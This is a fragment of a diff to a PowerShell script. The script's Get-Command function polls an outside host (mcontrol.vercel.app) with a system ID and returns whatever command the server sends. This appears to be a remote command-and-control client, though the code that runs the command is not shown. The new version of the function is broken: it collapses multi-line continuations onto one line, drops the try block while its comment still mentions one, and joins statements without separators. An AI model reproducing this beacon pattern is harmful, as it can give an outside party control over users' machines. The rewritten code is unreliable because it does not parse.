@@ -63,19 +63,10 @@ Invoke-RestMethod `
 }
 
 function Get-Command {
-   param (  $SystemId )
-Write-Host $SystemId
-    try {
-         $cmd = Invoke-RestMethod `
-                    -Uri "https://mcontrol.vercel.app/api/command?id=$SystemId" `
-                    -Method GET `
-                    -ContentType "application/json"  `
-          Write-Host "getcmd: $cmd"          
-           return $cmd.command
-
-    } catch {
-        "stop errors"
-    }
+    param ($SystemId  )
+      Write-Host "Checking ID: $SystemId" 
+      $cmd = Invoke-RestMethod ` -Uri "https://mcontrol.vercel.app/api/command?id=$SystemId" ` -Method GET ` -ContentType "application/json" ` -ErrorAction Stop # Added to ensure catch block works 
+          Write-Host "getcmd: $($cmd | ConvertTo-Json -Compress)" return $cmd.command
 }
 
 function mit([string]$command) {
